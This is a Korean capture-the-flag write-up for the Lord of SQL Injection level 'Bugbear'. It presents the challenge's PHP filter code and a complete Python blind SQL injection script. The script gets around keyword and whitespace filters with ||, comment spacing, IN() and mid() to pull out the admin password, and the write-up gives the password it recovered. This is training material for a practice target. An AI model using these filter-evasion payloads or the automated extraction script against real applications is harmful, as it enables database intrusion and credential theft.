# Lord of SQL injection No.13 Bugbear

Bugbear 문제는 `'`, `substr`, `ascii`, `=`, `or`, `and`, `공백(Whitespace)`, `like`, `0x`를 우회하여 Blind SQL Injection을 할할 수 있도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

```php
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe");
```

`preg_match`에서 `$_GET[pw]`에서는 `'`, `$_GET[no]`에서는 `substr`, `ascii`, `=`, `or`, `and`, `공백(Whitespace)`, `like`, `0x`를 필터링하여 `HeHe`를 출력한 후 문제 풀이에 실패하게 된다.

#### 문제 풀이 조건

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear");
```

DB에 저장된 `pw` 값과 입력받은 `pw` 값이 일치하면 문제 풀이에 성공하게 된다.

## Solution

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
pwlen = 0

for i in range(1,10):
    url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
    add_url = '-1/**/||/**/length(pw)/**/IN("{}")--'.format(i)
    print("Searching Password Length.. [{}]".format(i))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
    response = urllib.request.urlopen(re)

    if str(response.read()).find("Hello admin") != -1:
        pwlen = i
        print("Found length!! => {}".format(pwlen))
        break

for i in range(1,pwlen+1):
    for j in range(ord("0"),ord("z")):
        url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = '-1/**/||/**/mid(pw,1,{})/**/IN("{}")--'.format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")

        request = urllib.request.urlopen(re)

        if str(request.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```

`=`을 우회하기 위해 사용하던 `like`가 막혔기 때문에 이를 우회하기 위해 `IN()` 함수를 사용하여 우회하였다. `regexp` 를 사용하여 우회하는 방법도 있다.

#### like 우회

* [like, rlike, regexp](https://m.blog.naver.com/PostView.nhn?blogId=joyswan&logNo=150040036162&proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F)

* [SQL IN Operator](https://www.w3schools.com/sql/sql_in.asp)

공백(Whitespace)가 `preg_match`로 인해 사용하지 못하기 때문에 이를 우회할 방법이 필요하다.
이를 우회하는 방법은 `No.5 Wolfman`에서 자세히 알아본 적이 있었다.

* [공백을 우회하는 No.5 Wolfman writeup 다시보기](https://github.com/JaehunYoon/los_writeup/blob/master/los_no5_wolfman.md)

`for`문을 모두 마치면 `pw`값은 `735c2773`이 나오게 된다.

```
http://los.eagle-jump.org/bugbear_***.php?pw=735c2773
```

URL에 추출한 `pw`값인 `735c2773`를 삽입하면 DB의 `pw` 값과 일치하기 때문에 문제 풀이에 성공하게 된다.